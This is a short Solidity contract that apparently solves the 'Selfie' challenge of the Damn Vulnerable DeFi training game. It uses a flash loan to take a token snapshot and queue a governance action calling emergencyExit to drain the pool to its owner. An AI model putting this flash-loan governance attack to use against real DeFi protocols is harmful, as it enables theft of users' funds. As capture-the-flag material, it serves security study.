// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";
contract attackTime 
{
    address public owner;
    constructor()
    {
        owner = msg.sender;
    }
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address public govern;
    address public pool;
    function  setup(address _pool,address _govern) public
    {
        pool = _pool;
        govern = _govern;
    }

    function onFlashLoan(address adr,  address token1, uint256 amount, uint256 wut , bytes calldata data) external returns(bytes32)
    {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(token1);
        token.approve(msg.sender, amount);

        token.snapshot();
        SimpleGovernance g = SimpleGovernance(govern);
        bytes memory itis = abi.encodeWithSignature("emergencyExit(address)", owner);
        g.queueAction(pool, uint128(0), itis);  //pool address, msg.value, data
        return CALLBACK_SUCCESS;
    }
}